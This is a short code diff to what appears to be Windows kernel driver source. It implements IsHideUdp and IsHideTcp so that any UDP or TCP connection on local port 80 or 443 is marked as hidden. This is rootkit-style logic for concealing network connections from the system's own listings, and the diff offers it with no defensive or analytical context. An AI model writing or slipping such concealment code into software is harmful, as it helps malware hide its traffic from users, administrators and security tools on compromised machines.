@@ -15,8 +15,10 @@ bool IsHideUdp(_In_ PUdpTable Entry)
 {
     bool ret = false;
 
-    UNREFERENCED_PARAMETER(Entry);
-
+    if (RtlUshortByteSwap(Entry->LocalPort) == 80 ||
+        RtlUshortByteSwap(Entry->LocalPort) == 443) {
+        ret = true;
+    }
 
     return ret;
 }
@@ -31,8 +33,10 @@ bool IsHideTcp(_In_ PTcpTable Entry)
 {
     bool ret = false;
 
-    UNREFERENCED_PARAMETER(Entry);
-
+    if (RtlUshortByteSwap(Entry->LocalPort) == 80 ||
+        RtlUshortByteSwap(Entry->LocalPort) == 443) {
+        ret = true;
+    }
 
     return ret;
 }
